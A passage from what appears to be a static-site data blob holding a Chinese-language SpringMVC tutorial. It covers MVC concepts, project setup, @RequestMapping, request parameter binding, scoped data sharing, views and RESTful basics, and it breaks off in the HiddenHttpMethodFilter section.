:17541},{level:3,title:"HiddenHttpMethodFilter",slug:"hiddenhttpmethodfilter",normalizedTitle:"hiddenhttpmethodfilter",charIndex:8482},{level:3,title:"RESTful案例",slug:"restful案例",normalizedTitle:"restful案例",charIndex:19036},{level:2,title:"HttpMessageConverter",slug:"httpmessageconverter",normalizedTitle:"httpmessageconverter",charIndex:27971},{level:3,title:"@RequestBody",slug:"requestbody",normalizedTitle:"@requestbody",charIndex:28092},{level:3,title:"RequestEntity",slug:"requestentity",normalizedTitle:"requestentity",charIndex:28125},{level:3,title:"@ResponseBody",slug:"responsebody",normalizedTitle:"@responsebody",charIndex:28108},{level:3,title:"SpringMVC处理json",slug:"springmvc处理json",normalizedTitle:"springmvc处理json",charIndex:29790},{level:3,title:"SpringMVC处理ajax",slug:"springmvc处理ajax",normalizedTitle:"springmvc处理ajax",charIndex:30387},{level:3,title:"@RestController注解",slug:"restcontroller注解",normalizedTitle:"@restcontroller注解",charIndex:31536},{level:3,title:"ResponseEntity",slug:"responseentity",normalizedTitle:"responseentity",charIndex:28142},{level:2,title:"文件上传和下载",slug:"文件上传和下载",normalizedTitle:"文件上传和下载",charIndex:31731},{level:3,title:"文件下载功能",slug:"文件下载功能",normalizedTitle:"文件下载功能",charIndex:31743},{level:3,title:"文件上传功能",slug:"文件上传功能",normalizedTitle:"文件上传功能",charIndex:32697},{level:2,title:"拦截器",slug:"拦截器",normalizedTitle:"拦截器",charIndex:34030},{level:3,title:"拦截器的配置",slug:"拦截器的配置",normalizedTitle:"拦截器的配置",charIndex:34038},{level:3,title:"拦截器的三个处理方法",slug:"拦截器的三个处理方法",normalizedTitle:"拦截器的三个处理方法",charIndex:34593},{level:3,title:"多个拦截器的执行顺序",slug:"多个拦截器的执行顺序",normalizedTitle:"多个拦截器的执行顺序",charIndex:34820},{level:2,title:"异常处理器",slug:"异常处理器",normalizedTitle:"异常处理器",charIndex:35112},{level:3,title:"基于配置的异常处理",slug:"基于配置的异常处理",normalizedTitle:"基于配置的异常处理",charIndex:35122},{level:3,title:"基于注解的异常处理",slug:"基于注解的异常处理",normalizedTitle:"基于注解的异常处理",charIndex:35907},{level:2,title:"注解配置SpringMVC",slug:"注解配置springmvc",normalizedTitle:"注解配置springmvc",charIndex:36298},{level:2,title:"SpringMVC执行流程",slug:"springmvc执行流程",normalizedTitle:"springmvc执行流程",charIndex:41070},{level:3,title:"SpringMVC常用组件",slug:"springmvc常用组件",normalizedTitle:"springmvc常用组件",charIndex:41088},{level:3,title:"DispatcherServlet初始化过程",slug:"dispatcherservlet初始化过程",normalizedTitle:"dispatcherservlet初始化过程",charIndex:41526},{level:3,title:"初始化WebApplicationContext",slug:"初始化webapplicationcontext",normalizedTitle:"初始化webapplicationcontext",charIndex:41637},{level:3,title:"创建WebApplicationContext",slug:"创建webapplicationcontext",normalizedTitle:"创建webapplicationcontext",charIndex:43365},{level:3,title:"DispatcherServlet初始化策略",slug:"dispatcherservlet初始化策略",normalizedTitle:"dispatcherservlet初始化策略",charIndex:45380},{level:3,title:"DispatcherServlet调用组件处理请求",slug:"dispatcherservlet调用组件处理请求",normalizedTitle:"dispatcherservlet调用组件处理请求",charIndex:46021},{level:3,title:"SpringMVC的执行流程",slug:"springmvc的执行流程",normalizedTitle:"springmvc的执行流程",charIndex:56200}],headersStr:"SpringMVC简介 什么是MVC 什么是SpringMVC SpringMVC的特点 MVC开发环境搭建 Maven项目创建 Web.xml配置文件 创建请求控制器 创建SpringMVC配置文件 测试 总结 RequestMapping注解 @RequestMapping注解的功能 @RequestMapping注解的位置 @RequestMapping注解的value属性 @RequestMapping注解的method属性 @RequestMapping注解的params属性 @RequestMapping注解的headers属性 SpringMVC支持ant风格的路径 SpringMVC支持路径中的占位符 SpringMVC获取请求参数 通过ServletAPI获取 通过控制器方法的形参获取请求参数 @RequestParam @RequestHeader @CookieValue 通过POJO获取请求参数 解决获取请求参数的乱码问题 域对象共享数据 使用ServletAPI向request域对象共享数据 使用ModelAndView向request域对象共享数据 使用Model向request域对象共享数据 使用map向request域对象共享数据 使用ModelMap向request域对象共享数据 Model、ModelMap、Map的关系 session域共享数据 application域共享数据 SpringMVC的视图 ThymeleafView 转发视图 重定向视图 视图控制器view-controller RESTful RESTful简介 RESTful的实现 HiddenHttpMethodFilter RESTful案例 HttpMessageConverter @RequestBody RequestEntity @ResponseBody SpringMVC处理json SpringMVC处理ajax @RestController注解 ResponseEntity 文件上传和下载 文件下载功能 文件上传功能 拦截器 拦截器的配置 拦截器的三个处理方法 多个拦截器的执行顺序 异常处理器 基于配置的异常处理 基于注解的异常处理 注解配置SpringMVC SpringMVC执行流程 SpringMVC常用组件 DispatcherServlet初始化过程 初始化WebApplicationContext 创建WebApplicationContext DispatcherServlet初始化策略 DispatcherServlet调用组件处理请求 SpringMVC的执行流程",content:'# SpringMVC\n\n\n# SpringMVC简介\n\n\n# 什么是MVC\n\nMVC是一种软件架构的思想，将软件按照模型、视图、控制器来划分\n\nM：Model，模型层，指工程中的JavaBean，作用是处理数据 V：View，视图层，指工程中的html或jsp等页面，作用是与用户进行交互，展示数据 C：Controller，控制层，指工程中的servlet，作用是接收请求和响应浏览器\n\nMVC的工作流程： 用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，Controller调用相应的Model层处理请求，处理完毕将结果返回到Controller，Controller再根据请求处理的结果找到相应的View视图，渲染数据后最终响应给浏览器\n\nJavaBean分为两类：\n\n * 一类称为实体类Bean：专门存储业务数据的，如 Student、User 等\n * 一类称为业务处理 Bean：指 Service 或 Dao 对象，专门用于处理业务逻辑和数据访问。\n\n\n# 什么是SpringMVC\n\nSpringMVC是Spring的一个后续产品，是Spring的一个子项目 SpringMVC 是 Spring 为表述层开发提供的一整套完备的解决方案。在表述层框架历经 Strust、WebWork、Strust2 等诸多产品的历代更迭之后，目前业界普遍选择了 SpringMVC 作为 Java EE 项目表述层开发的首选方案。\n\n> 注：三层架构分为表述层（或表示层）、业务逻辑层、数据访问层，表述层表示前台页面和后台servlet\n\n\n# SpringMVC的特点\n\n * Spring 家族原生产品，与 IOC 容器等基础设施无缝对接\n * 基于原生的Servlet，通过了功能强大的前端控制器DispatcherServlet，对请求和响应进行统一处理\n * 表述层各细分领域需要解决的问题全方位覆盖，提供全面解决方案\n * 代码清新简洁，大幅度提升开发效率\n * 内部组件化程度高，可插拔式组件即插即用，想要什么功能配置相应组件即可\n * 性能卓著，尤其适合现代大型、超大型互联网项目要求\n\n\n# MVC开发环境搭建\n\n\n# Maven项目创建\n\n创建MAVEN web项目，引入MAVEN依赖\n\n<dependencies>\n    \x3c!-- SpringMVC --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.1</version>\n    </dependency>\n\n    \x3c!-- 日志 --\x3e\n    <dependency>\n        <groupId>ch.qos.logback</groupId>\n        <artifactId>logback-classic</artifactId>\n        <version>1.2.3</version>\n    </dependency>\n\n    \x3c!-- ServletAPI --\x3e\n    <dependency>\n        <groupId>javax.servlet</groupId>\n        <artifactId>javax.servlet-api</artifactId>\n        <version>3.1.0</version>\n        <scope>provided</scope>\n    </dependency>\n\n    \x3c!-- Spring5和Thymeleaf整合包 --\x3e\n    <dependency>\n        <groupId>org.thymeleaf</groupId>\n        <artifactId>thymeleaf-spring5</artifactId>\n        <version>3.0.12.RELEASE</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# Web.xml配置文件\n\n# 默认配置方式\n\n此配置作用下，SpringMVC的配置文件默认位于WEB-INF下，默认名称为<servlet-name>-servlet.xml，例如，以下配置所对应SpringMVC的配置文件位于WEB-INF下，文件名为springMVC-servlet.xml\n\n\x3c!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --\x3e\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    \x3c!--\n        设置springMVC的核心控制器所能处理的请求的请求路径\n        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径\n        但是/不能匹配.jsp请求路径的请求\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 扩展配置方式\n\n可通过init-param标签设置SpringMVC配置文件的位置和名称，通过load-on-startup标签设置SpringMVC前端控制器DispatcherServlet的初始化时间\n\n\x3c!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --\x3e\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    \x3c!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 --\x3e\n    <init-param>\n        \x3c!-- contextConfigLocation为固定值 --\x3e\n        <param-name>contextConfigLocation</param-name>\n        \x3c!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --\x3e\n        <param-value>classpath:springMVC.xml</param-value>\n    </init-param>\n    \x3c!-- \n         作为框架的核心组件，在启动过程中有大量的初始化操作要做\n        而这些操作放在第一次请求时才执行会严重影响访问速度\n        因此需要通过此标签将启动控制DispatcherServlet的初始化时间提前到服务器启动时\n    --\x3e\n    <load-on-startup>1</load-on-startup>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    \x3c!--\n        设置springMVC的核心控制器所能处理的请求的请求路径\n        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径\n        但是/不能匹配.jsp请求路径的请求\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n&lt;url-pattern>标签中使用/和/*的区别：\n所匹配的请求可以是/login或.html或.js或.css方式的请求路径，但是/不能匹配.jsp请求路径的请求。因此就可以避免在访问jsp页面时，该请求被DispatcherServlet处理，从而找不到相应的页面\n/* 则能够匹配所有请求，例如在使用过滤器时，若需要对所有请求进行过滤，就需要使用/\\*的写法\n\n\n1\n2\n3\n\n\n\n# 创建请求控制器\n\n由于前端控制器对浏览器发送的请求进行了统一的处理，但是具体的请求有不同的处理过程，因此需要创建处理具体请求的类，即请求控制器\n\n请求控制器中每一个处理请求的方法成为控制器方法\n\n因为SpringMVC的控制器由一个POJO（普通的Java类）担任，因此需要通过@Controller注解将其标识为一个控制层组件，交给Spring的IoC容器管理，此时SpringMVC才能够识别控制器的存在\n\n@Controller\npublic class HelloController {\n\n}\n\n\n1\n2\n3\n4\n\n\n\n# 创建SpringMVC配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="<http://www.springframework.org/schema/beans>"\n       xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"\n       xmlns:context="<http://www.springframework.org/schema/context>"\n       xsi:schemaLocation="<http://www.springframework.org/schema/beans> <http://www.springframework.org/schema/beans/spring-beans.xsd>\n                            <http://www.springframework.org/schema/context> <http://www.springframework.org/schema/context/spring-context.xsd>">\n\n    <context:component-scan base-package="com.pwddd.mvc" />\n    \x3c!-- 配置Thymeleaf视图解析器 --\x3e\n    <bean id="viewResolver" class="org.thymeleaf.spring5.view.ThymeleafViewResolver">\n        <property name="order" value="1"/>\n        <property name="characterEncoding" value="UTF-8"/>\n        <property name="templateEngine">\n            <bean class="org.thymeleaf.spring5.SpringTemplateEngine">\n                <property name="templateResolver">\n                    <bean class="org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver">\n\n                        \x3c!-- 视图前缀 --\x3e\n                        <property name="prefix" value="/WEB-INF/templates/"/>\n\n                        \x3c!-- 视图后缀 --\x3e\n                        <property name="suffix" value=".html"/>\n                        <property name="templateMode" value="HTML5"/>\n                        <property name="characterEncoding" value="UTF-8" />\n                    </bean>\n                </property>\n            </bean>\n        </property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 测试\n\n 1. 实现对首页的访问 在请求控制器中创建处理请求的方法\n\n// @RequestMapping注解：处理请求和控制器方法之间的映射关系\n// @RequestMapping注解的value属性可以通过请求地址匹配请求，/表示的当前工程的上下文路径\n// localhost:8080/springMVC/\n@RequestMapping("/")\npublic String index() {\n    //设置视图名称\n    return "index";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 通过超链接跳转到指定页面 在主页index.html中设置超链接\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="<http://www.thymeleaf.org>">\n<head>\n    <meta charset="UTF-8">\n    <title>首页</title>\n</head>\n<body>\n    <h1>首页</h1>\n    <a th:href="@{/hello}">HelloWorld</a><br/>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n在请求控制器中创建处理请求的方法\n\n@RequestMapping("/hello")\npublic String HelloWorld() {\n    return "target";\n}\n\n\n1\n2\n3\n4\n\n\n\n# 总结\n\n浏览器发送请求，若请求地址符合前端控制器的url-pattern，该请求就会被前端控制器DispatcherServlet处理。前端控制器会读取SpringMVC的核心配置文件，通过扫描组件找到控制器，将请求地址和控制器中@RequestMapping注解的value属性值进行匹配，若匹配成功，该注解所标识的控制器方法就是处理请求的方法。处理请求的方法需要返回一个字符串类型的视图名称，该视图名称会被视图解析器解析，加上前缀和后缀组成视图的路径，通过Thymeleaf对视图进行渲染，最终转发到视图所对应页面\n\n\n# RequestMapping注解\n\n\n# @RequestMapping注解的功能\n\n从注解名称上我们可以看到，@RequestMapping注解的作用就是将请求和处理请求的控制器方法关联起来，建立映射关系。 SpringMVC 接收到指定的请求，就会来找到在映射关系中对应的控制器方法来处理这个请求。\n\n\n# @RequestMapping注解的位置\n\n@RequestMapping标识一个类：设置映射请求的请求路径的初始信息 @RequestMapping标识一个方法：设置映射请求请求路径的具体信息\n\n@Controller\n@RequestMapping("/test")\npublic class RequestMappingController {\n\n    //此时请求映射所映射的请求的请求路径为：/test/testRequestMapping\n    @RequestMapping("/testRequestMapping")\n    public String testRequestMapping(){\n        return "success";\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# @RequestMapping注解的value属性\n\n@RequestMapping注解的value属性通过请求的请求地址匹配请求映射 @RequestMapping注解的value属性是一个字符串类型的数组，表示该请求映射能够匹配多个请求地址所对应的请求 @RequestMapping注解的value属性必须设置，至少通过请求地址匹配请求映射\n\n<a th:href="@{/test/testRequestMapping/}" >测试testRequestMapping</a><br>  \n<a th:href="@{/test/test/}" >测试testRequestMapping---test</a><br>\n\n\n1\n2\n\n\n@RequestMapping(\n        value = {"/testRequestMapping", "/test"}\n)\npublic String testRequestMapping(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @RequestMapping注解的method属性\n\n@RequestMapping注解的method属性通过请求的请求方式（get或post）匹配请求映射 @RequestMapping注解的method属性是一个RequestMethod类型的数组，表示该请求映射能够匹配多种请求方式的请求 若当前请求的请求地址满足请求映射的value属性，但是请求方式不满足method属性，则浏览器报错405：Request method \'POST\' not supported\n\n<form th:action="@{/test/testMethod}" method="post" >  \n <input type="submit">  \n</form>\n\n\n1\n2\n3\n\n\n@RequestMapping(  \n value = {"/testMethod"},  \n method = RequestMethod.POST  \n)  \npublic String testMethod(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> TIPS： 1、对于处理指定请求方式的控制器方法，SpringMVC中提供了@RequestMapping的派生注解\n> \n> 处理get请求的映射--\x3e@GetMapping\n> \n> 处理post请求的映射--\x3e@PostMapping\n> \n> 处理put请求的映射--\x3e@PutMapping\n> \n> 处理delete请求的映射--\x3e@DeleteMapping\n> \n> 2、常用的请求方式有get，post，put，delete\n> \n> 但是目前浏览器只支持get和post，若在form表单提交时，为method设置了其他请求方式的字符串（put或delete），则按照默认的请求方式get处理\n> \n> 若要发送put和delete请求，则需要通过spring提供的过滤器HiddenHttpMethodFilter，在RESTful部分会讲到。\n\n\n# @RequestMapping注解的params属性\n\n@RequestMapping注解的params属性通过请求的请求参数匹配请求映射 @RequestMapping注解的params属性是一个字符串类型的数组，可以通过四种表达式设置请求参数和请求映射的匹配关系 "param"：要求请求映射所匹配的请求必须携带param请求参数 "!param"：要求请求映射所匹配的请求必须不能携带param请求参数 "param=value"：要求请求映射所匹配的请求必须携带param请求参数且param=value "param!=value"：要求请求映射所匹配的请求必须携带param请求参数但是param!=value\n\n<a th:href="@{/test/testParam(username=\'zhangsan\',password=123456)}" >测试param</a>\n\n\n1\n\n\n@RequestMapping(value = "testParam",method = RequestMethod.GET,params = {"!haha","username=zhangsan"})  \npublic String testParam(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n> 注： 若当前请求满足@RequestMapping注解的value和method属性，但是不满足params属性，此时页面回报错400：Parameter conditions "username, password!=123456" not met for actual request parameters: username={admin}, password={123456}\n\n\n# @RequestMapping注解的headers属性\n\n@RequestMapping注解的headers属性通过请求的请求头信息匹配请求映射\n\n@RequestMapping注解的headers属性是一个字符串类型的数组，可以通过四种表达式设置请求头信息和请求映射的匹配关系\n\n"header"：要求请求映射所匹配的请求必须携带header请求头信息\n\n"!header"：要求请求映射所匹配的请求必须不能携带header请求头信息\n\n"header=value"：要求请求映射所匹配的请求必须携带header请求头信息且header=value\n\n"header!=value"：要求请求映射所匹配的请求必须携带header请求头信息且header!=value\n\n若当前请求满足@RequestMapping注解的value和method属性，但是不满足headers属性，此时页面显示404错误，即资源未找到\n\n\n# SpringMVC支持ant风格的路径\n\n？：表示任意的单个字符\n\n*：表示任意的0个或多个字符\n\n**：表示任意的一层或多层目录\n\n注意：在使用**时，只能使用/**/xxx的方式\n\n\n# SpringMVC支持路径中的占位符\n\n原始方式：/deleteUser?id=1\n\nREST方式：/user/1 请求方式为：delete\n\nSpringMVC路径中的占位符常用于RESTful风格中，当请求路径中将某些数据通过路径的方式传输到服务器中，就可以在相应的@RequestMapping注解的value属性中通过占位符{xxx}表示传输的数据，在通过@PathVariable注解，将占位符所表示的数据赋值给控制器方法的形参\n\n<a th:href="@{/test/testParam2/1/2/3/4/}" >测试 /1/2/3/4/</a>\n\n\n1\n\n\n@RequestMapping(value = "/testParam2/{p1}/{p2}/{p3}/{p4}")  \npublic String testParam2(@PathVariable("p1") String p1,@PathVariable("p2") String p2,@PathVariable("p3") String p3,@PathVariable("p4") String p4){  \n System.out.println(p1+p2+p3+p4);  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# SpringMVC获取请求参数\n\n\n# 通过ServletAPI获取\n\n将HttpServletRequest作为控制器方法的形参，此时HttpServletRequest类型的参数表示封装了当前请求的请求报文的对象\n\n<a th:href="@{/test/testServletReq(username=\'zhangsan\',password=1234)}">测试从servletapi获取参数</a>\n\n\n1\n\n\n@RequestMapping("/testServletReq")  \npublic String testServletReq(HttpServletRequest request){  \n String username = request.getParameter("username");  \n String password = request.getParameter("password");  \n System.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n// 控制台输出：username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 通过控制器方法的形参获取请求参数\n\n在控制器方法的形参位置，设置和请求参数同名的形参，当浏览器发送请求，匹配到请求映射时，在DispatcherServlet中就会将请求参数赋值给相应的形参。\n\n<a th:href="@{/test/testController(username=\'zhangsan\',password=1234)}">测试从控制器获取参数</a>\n\n\n1\n\n\n@RequestMapping("/testController")  \npublic String testServletReq(String username,String password){  \n System.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n//控制台输出：username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 注： 若请求所传输的请求参数中有多个同名的请求参数，此时可以在控制器方法的形参中设置字符串数组或者字符串类型的形参接收此请求参数 若使用字符串数组类型的形参，此参数的数组中包含了每一个数据 若使用字符串类型的形参，此参数的值为每个数据中间使用逗号拼接的结果\n\n\n# @RequestParam\n\n@RequestParam是将请求参数和控制器方法的形参创建映射关系 @RequestParam注解一共有三个属性：\n\n * value：指定为形参赋值的请求参数的参数名\n\n * required：设置是否必须传输此请求参数，默认值为true\n   \n   若设置为true时，则当前请求必须传输value所指定的请求参数，若没有传输该请求参数，且没有设置defaultValue属性，则页面报错400：Required String parameter \'xxx\' is not present；若设置为false，则当前请求不是必须传输value所指定的请求参数，若没有传输，则注解所标识的形参的值为null\n\n * defaultValue：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值为""时，则使用默认值为形参赋值\n\n\n# @RequestHeader\n\n@RequestHeader是将请求头信息和控制器方法的形参创建映射关系 @RequestHeader注解一共有三个属性：value、required、defaultValue，用法同@RequestParam\n\n\n# @CookieValue\n\n@CookieValue是将cookie数据和控制器方法的形参创建映射关系 @CookieValue注解一共有三个属性：value、required、defaultValue，用法同@RequestParam\n\n\n# 通过POJO获取请求参数\n\n可以在控制器方法的形参位置设置一个实体类类型的形参，此时若浏览器传输的请求参数的参数名和实体类中的属性名一致，那么请求参数就会为此属性赋值。\n\n<form th:action="@{/test/testEntity}" method="post">  \n <input type="text" value="zhangsan" name="username"> <br>  \n <input type="text" value="123456" name="password"> <br>  \n <input type="text" value="email" name="email"> <br>  \n <input type="submit" value="测试实体注入属性">  \n</form>\n\n\n1\n2\n3\n4\n5\n6\n\n\n@RequestMapping(value = "/testEntity",method = RequestMethod.POST)  \npublic String testEntity(User user){  \n System.out.println(user);  \n return "success";  \n}\n\n// User{id=\'null\', username=\'zhangsan\', password=\'123456\', email=\'email\'}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 解决获取请求参数的乱码问题\n\n乱码问题分为两种，第一种为get请求参数乱码问题，解决办法在 JavaWeb中提到，可以在Tomcat配置文件中配置。第二种为POST请求参数乱码，可以配置过滤器进行设置编码格式。 解决获取请求参数的乱码问题，可以使用SpringMVC提供的编码过滤器CharacterEncodingFilter，但是必须在web.xml中进行注册。\n\n<filter>  \n <filter-name>CharacterEncodingFilter</filter-name>  \n <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>  \n <init-param>  \n <param-name>encoding</param-name>  \n <param-value>utf-8</param-value>  \n </init-param>  \n <init-param>  \n <param-name>forceResponseEncoding</param-name>  \n <param-value>true</param-value>  \n </init-param>  \n</filter>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> 注： SpringMVC中处理编码的过滤器一定要配置到其他过滤器之前，否则无效\n\n\n# 域对象共享数据\n\n\n# 使用ServletAPI向request域对象共享数据\n\n@RequestMapping("/testServletAPI")  \npublic String testServletAPI(HttpServletRequest request){  \n request.setAttribute("testScope","hello,ServletAPI");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 使用ModelAndView向request域对象共享数据\n\n@RequestMapping("/testModelAndView")  \npublic ModelAndView testModelAndView(){  \n ModelAndView modelAndView = new ModelAndView();  \n modelAndView.setViewName("success");  \n modelAndView.addObject("testScope","hello,modelandView");  \n return modelAndView;  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 使用Model向request域对象共享数据\n\n@RequestMapping("/testModel")  \npublic String testModelAndView(Model model){  \n model.addAttribute("testScope","hello,Model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 使用map向request域对象共享数据\n\n@RequestMapping("/testMap")  \npublic String testMap(Map<String,Object> map){  \n map.put("testScope","hello,Model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 使用ModelMap向request域对象共享数据\n\n@RequestMapping("/testModelMap")  \npublic String testModelMap(ModelMap modelMap){  \n modelMap.put("testScope","hello,modelMap");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# Model、ModelMap、Map的关系\n\nModel、ModelMap、Map类型的参数其实本质上都是 BindingAwareModelMap 类型的\n\npublic interface Model{}\npublic class ModelMap extends LinkedHashMap<String, Object> {}\npublic class ExtendedModelMap extends ModelMap implements Model {}\npublic class BindingAwareModelMap extends ExtendedModelMap {}\n\n\n1\n2\n3\n4\n\n\n\n# session域共享数据\n\n<p th:text="${session.testScope}" ></p>\n\n\n1\n\n\n@RequestMapping("/testSession")  \npublic String testSession(HttpSession session){  \n session.setAttribute("testScope","hello,session");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# application域共享数据\n\n<p th:text="${application.testScope}" ></p>\n\n\n1\n\n\n@RequestMapping("/testApplication")  \npublic String testApplication(HttpSession session){  \n ServletContext servletContext = session.getServletContext();  \n servletContext.setAttribute("testScope","hello,application");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# SpringMVC的视图\n\nSpringMVC中的视图是View接口，视图的作用渲染数据，将模型Model中的数据展示给用户 SpringMVC视图的种类很多，默认有转发视图和重定向视图 当工程引入jstl的依赖，转发视图会自动转换为JstlView 若使用的视图技术为Thymeleaf，在SpringMVC的配置文件中配置了Thymeleaf的视图解析器，由此视图解析器解析之后所得到的是ThymeleafView。\n\n\n# ThymeleafView\n\n当控制器方法中所设置的视图名称没有任何前缀时，此时的视图名称会被SpringMVC配置文件中所配置的视图解析器解析，视图名称拼接视图前缀和视图后缀所得到的最终路径，会通过转发的方式实现跳转。\n\n@RequestMapping("/test")  \npublic String test(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# 转发视图\n\nSpringMVC中默认的转发视图是InternalResourceView SpringMVC中创建转发视图的情况： 当控制器方法中所设置的视图名称以"forward:"为前缀时，创建InternalResourceView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀"forward:"去掉，剩余部分作为最终路径通过转发的方式实现跳转\n\n例如"forward:/"，"forward:/employee"\n\n@RequestMapping("/testForward")\npublic String testForward(){\n    return "forward:/testHello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# 重定向视图\n\nSpringMVC中默认的重定向视图是RedirectView 当控制器方法中所设置的视图名称以"redirect:"为前缀时，创建RedirectView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀"redirect:"去掉，剩余部分作为最终路径通过重定向的方式实现跳转\n\n例如"redirect:/"，"redirect:/employee"\n\n@RequestMapping("/testRedirect")\npublic String testRedirect(){\n    return "redirect:/testHello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n> 注： 重定向视图在解析时，会先将redirect:前缀去掉，然后会判断剩余部分是否以/开头，若是则会自动拼接上下文路径。\n\n\n# 视图控制器view-controller\n\n当控制器方法中，仅仅用来实现页面跳转，即只需要设置视图名称时，可以将处理器方法使用view-controller标签进行表示。\n\n\x3c!--\n    path：设置处理的请求地址\n    view-name：设置请求地址所对应的视图名称\n--\x3e\n<mvc:view-controller path="/testView" view-name="success"></mvc:view-controller>\n\n\n1\n2\n3\n4\n5\n\n\n> 注： 当SpringMVC中设置任何一个view-controller时，其他控制器中的请求映射将全部失效，此时需要在SpringMVC的核心配置文件中设置开启mvc注解驱动的标签： <mvc:annotation-driven />\n\n\n# RESTful\n\n\n# RESTful简介\n\nREST：Representational State Transfer，表现层资源状态转移。\n\n# 资源\n\n资源是一种看待服务器的方式，即，将服务器看作是由很多离散的资源组成。每个资源是服务器上一个可命名的抽象概念。因为资源是一个抽象的概念，所以它不仅仅能代表服务器文件系统中的一个文件、数据库中的一张表等等具体的东西，可以将资源设计的要多抽象有多抽象，只要想象力允许而且客户端应用开发者能够理解。与面向对象设计类似，资源是以名词为核心来组织的，首先关注的是名词。一个资源可以由一个或多个URI来标识。URI既是资源的名称，也是资源在Web上的地址。对某个资源感兴趣的客户端应用，可以通过资源的URI与其进行交互。\n\n# 资源的表述\n\n资源的表述是一段对于资源在某个特定时刻的状态的描述。可以在客户端-服务器端之间转移（交换）。资源的表述可以有多种格式，例如HTML/XML/JSON/纯文本/图片/视频/音频等等。资源的表述格式可以通过协商机制来确定。请求-响应方向的表述通常使用不同的格式。\n\n# 状态转移\n\n状态转移说的是：在客户端和服务器端之间转移（transfer）代表资源状态的表述。通过转移和操作资源的表述，来间接实现操作资源的目的。\n\n\n# RESTful的实现\n\n具体说，就是 HTTP 协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。 它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE 用来删除资源。 REST 风格提倡 URL 地址使用统一的风格设计，从前到后各个单词使用斜杠分开，不使用问号键值对方式携带请求参数，而是将要发送给服务器的数据作为 URL 地址的一部分，以保证整体风格的一致性。\n\n操作     传统方式               REST风格\n查询操作   getUserById?id=1   user/1--\x3eget请求方式\n保存操作   saveUser           user--\x3epost请求方式\n删除操作   deleteUser?id=1    user/1--\x3edelete请求方式\n更新操作   updateUser         user--\x3eput请求方式\n\n\n# HiddenHttpMethodFilter\n\n由于浏览器只支持发送get和post方式的请求，那么该如何发送put和delete请求呢？ SpringMVC 提供了 HiddenHttpMethodFilter 帮助我们将 POST 请求转换为 DELETE 或 PUT 请求 HiddenHttpMethodFilter 处理put和delete请求的条件：\n\n * 当前请求的请求方式必须为post\n * 当前请求必须传输请求参数_method 满足以上条件，HiddenHttpMethodFilter 